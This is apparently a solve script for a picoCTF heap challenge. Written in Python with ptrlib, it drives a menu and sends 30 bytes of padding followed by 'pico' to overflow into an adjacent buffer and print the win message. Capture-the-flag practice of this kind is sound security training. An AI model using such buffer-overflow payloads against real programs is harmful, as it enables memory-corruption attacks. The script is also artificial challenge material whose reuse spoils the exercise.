#!/usr/bin/env python

import ptrlib as ptr

def connect():
    p = ptr.Process("./chall")
    # p = ptr.Socket("tethys.picoctf.net", 65386)
    return p


io = connect()
io.sendline(b"5")
io.sendline(b"2")
io.sendline(b"35")

payload = b""
payload += b"A" * 30
payload += b"pico"

io.sendline(payload)
io.sendline(b"4")

print(io.recvlineafter("YOU WIN!!11!!\n"))
